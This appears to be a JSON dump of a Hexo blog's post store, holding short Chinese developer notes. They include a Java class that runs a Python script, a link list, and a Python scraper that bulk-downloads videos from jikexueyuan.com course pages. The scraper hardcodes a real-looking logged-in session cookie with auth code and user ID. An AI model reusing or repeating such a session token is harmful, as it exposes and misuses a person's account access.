}\n}\n```","slug":"Java运行Python","published":1,"updated":"2018-07-10T13:10:09.842Z","_id":"cjjedmh7100030gtjzpt0nyrr","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.BufferedReader;</span><br><span class=\"line\">import java.io.InputStreamReader;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by hello.</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class testpy &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static String path = testpy.class.getResource(&quot;/&quot;).getPath() + &quot;python/test.py&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String hello() &#123;</span><br><span class=\"line\">        String hello = &quot;.....&quot;;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            System.out.println(&quot;start&quot;);</span><br><span class=\"line\">            System.out.println(path);</span><br><span class=\"line\">            Process pr = Runtime.getRuntime().exec(&quot;python &quot; + path);</span><br><span class=\"line\">            BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class=\"line\">                    pr.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = in.readLine()) != null) &#123;</span><br><span class=\"line\">                System.out.println(line);</span><br><span class=\"line\">                hello = line;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">            pr.waitFor();</span><br><span class=\"line\">            System.out.println(&quot;end&quot;);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return hello;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.BufferedReader;</span><br><span class=\"line\">import java.io.InputStreamReader;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by hello.</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class testpy &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static String path = testpy.class.getResource(&quot;/&quot;).getPath() + &quot;python/test.py&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String hello() &#123;</span><br><span class=\"line\">        String hello = &quot;.....&quot;;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            System.out.println(&quot;start&quot;);</span><br><span class=\"line\">            System.out.println(path);</span><br><span class=\"line\">            Process pr = Runtime.getRuntime().exec(&quot;python &quot; + path);</span><br><span class=\"line\">            BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class=\"line\">                    pr.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = in.readLine()) != null) &#123;</span><br><span class=\"line\">                System.out.println(line);</span><br><span class=\"line\">                hello = line;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">            pr.waitFor();</span><br><span class=\"line\">            System.out.println(&quot;end&quot;);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return hello;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"chrome浏览器背景图片位置","date":"2018-07-09T14:29:35.000Z","_content":"\n    C:\\Users\\hanqian18790\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions","source":"_posts/chrome浏览器背景图片位置.md","raw":"---\ntitle: chrome浏览器背景图片位置\ndate: 2018-07-09 22:29:35\ntags: note\n---\n\n    C:\\Users\\hanqian18790\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions","slug":"chrome浏览器背景图片位置","published":1,"updated":"2018-07-10T13:10:09.838Z","_id":"cjjedmh7300040gtjnlhxjuoz","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>C:\\Users\\hanqian18790\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>C:\\Users\\hanqian18790\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\n</code></pre>"},{"title":"intrestings","date":"2018-06-18T08:04:15.000Z","_content":"#### 1.[Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践](https://github.com/boylegu/SanicCRUD-vue/blob/master/README-CN.md)\n\n本项目将使用Sanic + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Python的全新一代高性能全栈开发实践的Demo\n\n#### 2.[SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践](https://github.com/boylegu/SpringBoot-vue/blob/master/README-CN.md)\n\n如今Web开发领域，当有人提到Java时，总会让人觉得臃肿、古老而过时且开发效率没有某些动态语言高效，甚至在此之前还有人高喊“Java 已死！”，但是事实真是如此吗？其实如果你一直关注着Java，那你的感悟会更深，尽管它有很多的缺点和啰嗦，但不可否认，Java依然是工业界中最优秀的语言，而且它一直保持着与时俱进。本项目将使用SpringBoot + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Java的微服务全栈快速开发实践的Demo。\n\n在某些时候，其开发效率已经并不比某些动态语言低。\n\n#### 3.[ 人人开源 / renren-fast](http://git.oschina.net/babaio/renren-fast)\nrenren-fast是一个轻量级的Java快速开发平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展；使用Spring Boot、Shiro、MyBatis、Redis、Bootstrap、Vue2.x等框架，包含：管理员列表、角色管理、菜单管理、定时任务、参数管理、代码生成器、日志管理、云存储、API模块(APP接口开发利器)、前后端分离等。 http://www.renren.io/open/\n\n#### 4.[给 Web 开发人员推荐的开源图形库 —— 2D/3D](https://my.oschina.net/editorial-story/blog/1476483?from=20170723)\n\n#### 5.[The Jupyter Notebook](http://jupyter.org/)\nThe Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and explanatory text. Uses include: data cleaning and transformation, numerical simulation, statistical modeling, machine learning and much more\n\n#### 6.[哈士奇](https://www.bilibili.com/video/av12455213/)\n\n#### - [人脸识别    Face Recognition](https://github.com/ageitgey/face_recognition)\nRecognize and manipulate faces from Python or from the command line with the world's simplest face recognition library.\n\nBuilt using dlib's state-of-the-art face recognition built with deep learning. The model has an accuracy of 99.38% on the Labeled Faces in the Wild benchmark.\n\nThis also provides a simple face_recognition command line tool that lets you do face recognition on a folder of images from the command line!","source":"_posts/intrestings.md","raw":"---\ntitle: intrestings\ndate: 2018-06-18 16:04:15\ntags: note\n---\n#### 1.[Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践](https://github.com/boylegu/SanicCRUD-vue/blob/master/README-CN.md)\n\n本项目将使用Sanic + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Python的全新一代高性能全栈开发实践的Demo\n\n#### 2.[SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践](https://github.com/boylegu/SpringBoot-vue/blob/master/README-CN.md)\n\n如今Web开发领域，当有人提到Java时，总会让人觉得臃肿、古老而过时且开发效率没有某些动态语言高效，甚至在此之前还有人高喊“Java 已死！”，但是事实真是如此吗？其实如果你一直关注着Java，那你的感悟会更深，尽管它有很多的缺点和啰嗦，但不可否认，Java依然是工业界中最优秀的语言，而且它一直保持着与时俱进。本项目将使用SpringBoot + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Java的微服务全栈快速开发实践的Demo。\n\n在某些时候，其开发效率已经并不比某些动态语言低。\n\n#### 3.[ 人人开源 / renren-fast](http://git.oschina.net/babaio/renren-fast)\nrenren-fast是一个轻量级的Java快速开发平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展；使用Spring Boot、Shiro、MyBatis、Redis、Bootstrap、Vue2.x等框架，包含：管理员列表、角色管理、菜单管理、定时任务、参数管理、代码生成器、日志管理、云存储、API模块(APP接口开发利器)、前后端分离等。 http://www.renren.io/open/\n\n#### 4.[给 Web 开发人员推荐的开源图形库 —— 2D/3D](https://my.oschina.net/editorial-story/blog/1476483?from=20170723)\n\n#### 5.[The Jupyter Notebook](http://jupyter.org/)\nThe Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and explanatory text. Uses include: data cleaning and transformation, numerical simulation, statistical modeling, machine learning and much more\n\n#### 6.[哈士奇](https://www.bilibili.com/video/av12455213/)\n\n#### - [人脸识别    Face Recognition](https://github.com/ageitgey/face_recognition)\nRecognize and manipulate faces from Python or from the command line with the world's simplest face recognition library.\n\nBuilt using dlib's state-of-the-art face recognition built with deep learning. The model has an accuracy of 99.38% on the Labeled Faces in the Wild benchmark.\n\nThis also provides a simple face_recognition command line tool that lets you do face recognition on a folder of images from the command line!","slug":"intrestings","published":1,"updated":"2018-07-10T13:10:09.841Z","_id":"cjjedmh7400050gtjhemnc929","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-Sanic-＋-前端MVVM-一种新一代Python高性能全栈开发实践\"><a href=\"#1-Sanic-＋-前端MVVM-一种新一代Python高性能全栈开发实践\" class=\"headerlink\" title=\"1.Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践\"></a>1.<a href=\"https://github.com/boylegu/SanicCRUD-vue/blob/master/README-CN.md\" target=\"_blank\" rel=\"noopener\">Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践</a></h4><p>本项目将使用Sanic + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Python的全新一代高性能全栈开发实践的Demo</p>\n<h4 id=\"2-SpringBoot-＋-前端MVVM-基于Java的微服务全栈快速开发实践\"><a href=\"#2-SpringBoot-＋-前端MVVM-基于Java的微服务全栈快速开发实践\" class=\"headerlink\" title=\"2.SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践\"></a>2.<a href=\"https://github.com/boylegu/SpringBoot-vue/blob/master/README-CN.md\" target=\"_blank\" rel=\"noopener\">SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践</a></h4><p>如今Web开发领域，当有人提到Java时，总会让人觉得臃肿、古老而过时且开发效率没有某些动态语言高效，甚至在此之前还有人高喊“Java 已死！”，但是事实真是如此吗？其实如果你一直关注着Java，那你的感悟会更深，尽管它有很多的缺点和啰嗦，但不可否认，Java依然是工业界中最优秀的语言，而且它一直保持着与时俱进。本项目将使用SpringBoot + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Java的微服务全栈快速开发实践的Demo。</p>\n<p>在某些时候，其开发效率已经并不比某些动态语言低。</p>\n<h4 id=\"3-人人开源-renren-fast\"><a href=\"#3-人人开源-renren-fast\" class=\"headerlink\" title=\"3. 人人开源 / renren-fast\"></a>3.<a href=\"http://git.oschina.net/babaio/renren-fast\" target=\"_blank\" rel=\"noopener\"> 人人开源 / renren-fast</a></h4><p>renren-fast是一个轻量级的Java快速开发平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展；使用Spring Boot、Shiro、MyBatis、Redis、Bootstrap、Vue2.x等框架，包含：管理员列表、角色管理、菜单管理、定时任务、参数管理、代码生成器、日志管理、云存储、API模块(APP接口开发利器)、前后端分离等。 <a href=\"http://www.renren.io/open/\" target=\"_blank\" rel=\"noopener\">http://www.renren.io/open/</a></p>\n<h4 id=\"4-给-Web-开发人员推荐的开源图形库-——-2D-3D\"><a href=\"#4-给-Web-开发人员推荐的开源图形库-——-2D-3D\" class=\"headerlink\" title=\"4.给 Web 开发人员推荐的开源图形库 —— 2D/3D\"></a>4.<a href=\"https://my.oschina.net/editorial-story/blog/1476483?from=20170723\" target=\"_blank\" rel=\"noopener\">给 Web 开发人员推荐的开源图形库 —— 2D/3D</a></h4><h4 id=\"5-The-Jupyter-Notebook\"><a href=\"#5-The-Jupyter-Notebook\" class=\"headerlink\" title=\"5.The Jupyter Notebook\"></a>5.<a href=\"http://jupyter.org/\" target=\"_blank\" rel=\"noopener\">The Jupyter Notebook</a></h4><p>The Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and explanatory text. Uses include: data cleaning and transformation, numerical simulation, statistical modeling, machine learning and much more</p>\n<h4 id=\"6-哈士奇\"><a href=\"#6-哈士奇\" class=\"headerlink\" title=\"6.哈士奇\"></a>6.<a href=\"https://www.bilibili.com/video/av12455213/\" target=\"_blank\" rel=\"noopener\">哈士奇</a></h4><h4 id=\"人脸识别-Face-Recognition\"><a href=\"#人脸识别-Face-Recognition\" class=\"headerlink\" title=\"- 人脸识别    Face Recognition\"></a>- <a href=\"https://github.com/ageitgey/face_recognition\" target=\"_blank\" rel=\"noopener\">人脸识别    Face Recognition</a></h4><p>Recognize and manipulate faces from Python or from the command line with the world’s simplest face recognition library.</p>\n<p>Built using dlib’s state-of-the-art face recognition built with deep learning. The model has an accuracy of 99.38% on the Labeled Faces in the Wild benchmark.</p>\n<p>This also provides a simple face_recognition command line tool that lets you do face recognition on a folder of images from the command line!</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-Sanic-＋-前端MVVM-一种新一代Python高性能全栈开发实践\"><a href=\"#1-Sanic-＋-前端MVVM-一种新一代Python高性能全栈开发实践\" class=\"headerlink\" title=\"1.Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践\"></a>1.<a href=\"https://github.com/boylegu/SanicCRUD-vue/blob/master/README-CN.md\" target=\"_blank\" rel=\"noopener\">Sanic ＋ 前端MVVM 一种新一代Python高性能全栈开发实践</a></h4><p>本项目将使用Sanic + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Python的全新一代高性能全栈开发实践的Demo</p>\n<h4 id=\"2-SpringBoot-＋-前端MVVM-基于Java的微服务全栈快速开发实践\"><a href=\"#2-SpringBoot-＋-前端MVVM-基于Java的微服务全栈快速开发实践\" class=\"headerlink\" title=\"2.SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践\"></a>2.<a href=\"https://github.com/boylegu/SpringBoot-vue/blob/master/README-CN.md\" target=\"_blank\" rel=\"noopener\">SpringBoot ＋ 前端MVVM 基于Java的微服务全栈快速开发实践</a></h4><p>如今Web开发领域，当有人提到Java时，总会让人觉得臃肿、古老而过时且开发效率没有某些动态语言高效，甚至在此之前还有人高喊“Java 已死！”，但是事实真是如此吗？其实如果你一直关注着Java，那你的感悟会更深，尽管它有很多的缺点和啰嗦，但不可否认，Java依然是工业界中最优秀的语言，而且它一直保持着与时俱进。本项目将使用SpringBoot + Vue2 ＋ Webpack2 配合最简单CRUD的逻辑来展示一个基于Java的微服务全栈快速开发实践的Demo。</p>\n<p>在某些时候，其开发效率已经并不比某些动态语言低。</p>\n<h4 id=\"3-人人开源-renren-fast\"><a href=\"#3-人人开源-renren-fast\" class=\"headerlink\" title=\"3. 人人开源 / renren-fast\"></a>3.<a href=\"http://git.oschina.net/babaio/renren-fast\" target=\"_blank\" rel=\"noopener\"> 人人开源 / renren-fast</a></h4><p>renren-fast是一个轻量级的Java快速开发平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展；使用Spring Boot、Shiro、MyBatis、Redis、Bootstrap、Vue2.x等框架，包含：管理员列表、角色管理、菜单管理、定时任务、参数管理、代码生成器、日志管理、云存储、API模块(APP接口开发利器)、前后端分离等。 <a href=\"http://www.renren.io/open/\" target=\"_blank\" rel=\"noopener\">http://www.renren.io/open/</a></p>\n<h4 id=\"4-给-Web-开发人员推荐的开源图形库-——-2D-3D\"><a href=\"#4-给-Web-开发人员推荐的开源图形库-——-2D-3D\" class=\"headerlink\" title=\"4.给 Web 开发人员推荐的开源图形库 —— 2D/3D\"></a>4.<a href=\"https://my.oschina.net/editorial-story/blog/1476483?from=20170723\" target=\"_blank\" rel=\"noopener\">给 Web 开发人员推荐的开源图形库 —— 2D/3D</a></h4><h4 id=\"5-The-Jupyter-Notebook\"><a href=\"#5-The-Jupyter-Notebook\" class=\"headerlink\" title=\"5.The Jupyter Notebook\"></a>5.<a href=\"http://jupyter.org/\" target=\"_blank\" rel=\"noopener\">The Jupyter Notebook</a></h4><p>The Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and explanatory text. Uses include: data cleaning and transformation, numerical simulation, statistical modeling, machine learning and much more</p>\n<h4 id=\"6-哈士奇\"><a href=\"#6-哈士奇\" class=\"headerlink\" title=\"6.哈士奇\"></a>6.<a href=\"https://www.bilibili.com/video/av12455213/\" target=\"_blank\" rel=\"noopener\">哈士奇</a></h4><h4 id=\"人脸识别-Face-Recognition\"><a href=\"#人脸识别-Face-Recognition\" class=\"headerlink\" title=\"- 人脸识别    Face Recognition\"></a>- <a href=\"https://github.com/ageitgey/face_recognition\" target=\"_blank\" rel=\"noopener\">人脸识别    Face Recognition</a></h4><p>Recognize and manipulate faces from Python or from the command line with the world’s simplest face recognition library.</p>\n<p>Built using dlib’s state-of-the-art face recognition built with deep learning. The model has an accuracy of 99.38% on the Labeled Faces in the Wild benchmark.</p>\n<p>This also provides a simple face_recognition command line tool that lets you do face recognition on a folder of images from the command line!</p>\n"},{"title":"improve method","date":"2018-06-18T08:04:15.000Z","_content":"[阅读代码](http://geek.csdn.net/news/detail/214530)\n\n这是一个很重要的决定，也是一个很难给出建议的决定。我不能只是简单地告诉你应该阅读这个代码还是那个代码，因为它真的归结于你要做什么事情。但是，我将提供一些指导方针，帮助你去选择应该阅读什么内容。","source":"_posts/improve method.md","raw":"---\ntitle: improve method\ndate: 2018-06-18 16:04:15\ntags: note\n---\n[阅读代码](http://geek.csdn.net/news/detail/214530)\n\n这是一个很重要的决定，也是一个很难给出建议的决定。我不能只是简单地告诉你应该阅读这个代码还是那个代码，因为它真的归结于你要做什么事情。但是，我将提供一些指导方针，帮助你去选择应该阅读什么内容。","slug":"improve method","published":1,"updated":"2018-07-10T13:10:09.840Z","_id":"cjjedmh7700080gtj0fhk13ih","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://geek.csdn.net/news/detail/214530\" target=\"_blank\" rel=\"noopener\">阅读代码</a></p>\n<p>这是一个很重要的决定，也是一个很难给出建议的决定。我不能只是简单地告诉你应该阅读这个代码还是那个代码，因为它真的归结于你要做什么事情。但是，我将提供一些指导方针，帮助你去选择应该阅读什么内容。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://geek.csdn.net/news/detail/214530\" target=\"_blank\" rel=\"noopener\">阅读代码</a></p>\n<p>这是一个很重要的决定，也是一个很难给出建议的决定。我不能只是简单地告诉你应该阅读这个代码还是那个代码，因为它真的归结于你要做什么事情。但是，我将提供一些指导方针，帮助你去选择应该阅读什么内容。</p>\n"},{"title":"jike","date":"2018-06-18T08:04:15.000Z","_content":"```\n# -*- coding:utf-8 -*-\n\nimport requests\nimport re\nimport os\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\n    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',\n    'Accept-Encoding': 'gzip, deflate',\n    #'Referer':'http://www.jikexueyuan.com/course/1888.html?ss=1',\n    'Cookie':'td_cookie=1156121737; _ga=GA1.2.380983170.1517797102; jkxyid_v2=574de074-6b6b-4475-a7f2-f01a14c4dd21; gr_user_id=93987888-4f04-4dc8-a2d8-b01212db5f21; _uab_collina=151779718059576220008262; MEIQIA_EXTRA_TRACK_ID=0vxp6LiOs5F6RZmZFpn0fdzGX1W; _umdata=C234BF9D3AFA6FE71EA6E4CE48D9BD53DB0208CB20D959012232396F043CC94EAD06E375B71FBF5DCD43AD3E795C914CAF4E29E6B21796B4E2F1E1803717844A; td_cookie=1583310513; _gid=GA1.2.25731033.1520306022; otherlogin=qq; uname=qq_9e3o2asf; uid=4627872; code=JYEUNA; authcode=135fwTzluWIwAbg4QQgj48oRfZkTbGiov3CgE5kvOkHaekzFmCYrdmcB8F3CED6V8GIp4eDkwxmpTKUyk9DsQBTJ1QvVOl8Xpwj5BXlhE81KtNQSlGsSOZYwc17WawQ; avatar=https%3A%2F%2Fassets.jikexueyuan.com%2Fuser%2Favtar%2Fdefault.gif; ca_status=1; vip_status=1; level_id=1; is_expire=0; domain=0iqWVUPUV; svip_status=0; svip_is_expire=1; QINGCLOUDELB=84b10773c6746376c2c7ad1fac354ddfd562b81daa2a899c46d3a1e304c7eb2b|Wp5di|Wp5di; gr_session_id_aacd01fff9535e79=73501102-bee7-4b50-a563-9f0cd3bd3a29; gr_cs1_73501102-bee7-4b50-a563-9f0cd3bd3a29=uid%3A4627872'\n}\n\nreferParam = {'course_id': '1888'}\n\n\nbigdata = 'http://ke.jikexueyuan.com/zhiye/bigdata/'\nhtml = requests.get(bigdata,headers=header)\nchapterRule = '<a jktag=\".*\" target=\"_blank\" href=\"(.*?)\" title=\".*\" class=\"inner\">'\nchapterUrl = re.findall(re.compile(chapterRule),html.text)\ni=0\n\nfor chapter in chapterUrl:\n    html = requests.get('http:'+chapter,headers=header)\n    #referData = requests.get('http://www.jikexueyuan.com/course/1888.html',headers=header,params=referParam)\n    #print(referData.text)\n    #print(html.text)\n\n    chapterTitleRule = '<a class=\"active\" href=\"javascript:;\">(.*?)</a>'\n    chapterTile = re.findall(re.compile(chapterTitleRule,re.S),str(html.content,'utf-8'))[0]\n    dir = str(i)+chapterTile\n    os.mkdir( dir, 7777 )\n    i = i+1\n\n    contentsRule = '<span class=\"sm-icon \"></span>\\n\\s*<a href=\"\\/\\/(.*?)\" jktag=\".*\">.*?<\\/a>'\n    contentsPattern = re.compile(contentsRule)\n    contentsUrls = re.findall(contentsPattern,html.text)\n    print(contentsUrls)\n    for courseUrl in contentsUrls:\n        courseHtml = requests.get('http://'+courseUrl,headers=header)\n\n        vedioRule = '<source src=\"(.*?)\".* type=\"video/mp4\"'\n        titleRule = '<span class=\"tit\">(.*?)</span>'\n\n        vedioPattern = re.compile(vedioRule,re.S)\n        titlePattern = re.compile(titleRule,re.S)\n\n        vedioUrl = re.findall(vedioPattern,courseHtml.text)[0]\n        title = re.findall(titlePattern,str(courseHtml.content,'utf-8'))[0]\n\n        vedioUrl = vedioUrl.replace('amp;','')\n\n        print(vedioUrl)\n        print(title)\n\n        vedio = requests.get(url=vedioUrl)\n        with open(dir+'/'+title+'.mp4', 'wb') as f:\n            f.write(vedio.content)\n            f.flush()\n\n","source":"_posts/jike.md","raw":"---\ntitle: jike\ndate: 2018-06-18 16:04:15\ntags: note\n---\n```\n# -*- coding:utf-8 -*-\n\nimport requests\nimport re\nimport os\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\n    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',\n    'Accept-Encoding': 'gzip, deflate',\n    #'Referer':'http://www.jikexueyuan.com/course/1888.html?ss=1',\n    'Cookie':'td_cookie=1156121737; _ga=GA1.2.380983170.1517797102; jkxyid_v2=574de074-6b6b-4475-a7f2-f01a14c4dd21; gr_user_id=93987888-4f04-4dc8-a2d8-b01212db5f21; _uab_collina=151779718059576220008262; MEIQIA_EXTRA_TRACK_ID=0vxp6LiOs5F6RZmZFpn0fdzGX1W; _umdata=C234BF9D3AFA6FE71EA6E4CE48D9BD53DB0208CB20D959012232396F043CC94EAD06E375B71FBF5DCD43AD3E795C914CAF4E29E6B21796B4E2F1E1803717844A; td_cookie=1583310513; _gid=GA1.2.25731033.1520306022; otherlogin=qq; uname=qq_9e3o2asf; uid=4627872; code=JYEUNA; authcode=135fwTzluWIwAbg4QQgj48oRfZkTbGiov3CgE5kvOkHaekzFmCYrdmcB8F3CED6V8GIp4eDkwxmpTKUyk9DsQBTJ1QvVOl8Xpwj5BXlhE81KtNQSlGsSOZYwc17WawQ; avatar=https%3A%2F%2Fassets.jikexueyuan.com%2Fuser%2Favtar%2Fdefault.gif; ca_status=1; vip_status=1; level_id=1; is_expire=0; domain=0iqWVUPUV; svip_status=0; svip_is_expire=1; QINGCLOUDELB=84b10773c6746376c2c7ad1fac354ddfd562b81daa2a899c46d3a1e304c7eb2b|Wp5di|Wp5di; gr_session_id_aacd01fff9535e79=73501102-bee7-4b50-a563-9f0cd3bd3a29; gr_cs1_73501102-bee7-4b50-a563-9f0cd3bd3a29=uid%3A4627872'\n}\n\nreferParam = {'course_id': '1888'}\n\n\nbigdata = 'http://ke.jikexueyuan.com/zhiye/bigdata/'\nhtml = requests.get(bigdata,headers=header)\nchapterRule = '<a jktag=\".*\" target=\"_blank\" href=\"(.*?)\" title=\".*\" class=\"inner\">'\nchapterUrl = re.findall(re.compile(chapterRule),html.text)\ni=0\n\nfor chapter in chapterUrl:\n    html = requests.get('http:'+chapter,headers=header)\n    #referData = requests.get('http://www.jikexueyuan.com/course/1888.html',headers=header,params=referParam)\n    #print(referData.text)\n    #print(html.text)\n\n    chapterTitleRule = '<a class=\"active\" href=\"javascript:;\">(.*?)</a>'\n    chapterTile = re.findall(re.compile(chapterTitleRule,re.S),str(html.content,'utf-8'))[0]\n    dir = str(i)+chapterTile\n    os.mkdir( dir, 7777 )\n    i = i+1\n\n    contentsRule = '<span class=\"sm-icon \"></span>\\n\\s*<a href=\"\\/\\/(.*?)\" jktag=\".*\">.*?<\\/a>'\n    contentsPattern = re.compile(contentsRule)\n    contentsUrls = re.findall(contentsPattern,html.text)\n    print(contentsUrls)\n    for courseUrl in contentsUrls:\n        courseHtml = requests.get('http://'+courseUrl,headers=header)\n\n        vedioRule = '<source src=\"(.*?)\".* type=\"video/mp4\"'\n        titleRule = '<span class=\"tit\">(.*?)</span>'\n\n        vedioPattern = re.compile(vedioRule,re.S)\n        titlePattern = re.compile(titleRule,re.S)\n\n        vedioUrl = re.findall(vedioPattern,courseHtml.text)[0]\n        title = re.findall(titlePattern,str(courseHtml.content,'utf-8'))[0]\n\n        vedioUrl = vedioUrl.replace('amp;','')\n\n        print(vedioUrl)\n        print(title)\n\n        vedio = requests.get(url=vedioUrl)\n        with open(dir+'/'+title+'.mp4', 'wb') as f:\n            f.write(vedio.content)\n            f.flush()\n\n","slug":"jike","published":1,"updated":"2018-07-09T14:41:09.067Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjjedmh79000a0gtjr0oi4rm9","content":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re<br>import os</p>\n<p>header = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘zh-CN,zh;q=0.9,en;q=0.8’,<br>    ‘Accept-Encoding’: ‘gzip, deflate’,</p>\n<pre><code>#&apos;Referer&apos;:&apos;http://www.jikexueyuan.com/course/1888.html?ss=1&apos;,\n&apos;Cookie&apos;:&apos;td_cookie=1156121737; _ga=GA1.2.380983170.1517797102; jkxyid_v2=574de074-6b6b-4475-a7f2-f01a14c4dd21; gr_user_id=93987888-4f04-4dc8-a2d8-b01212db5f21; _uab_collina=151779718059576220008262; MEIQIA_EXTRA_TRACK_ID=0vxp6LiOs5F6RZmZFpn0fdzGX1W; 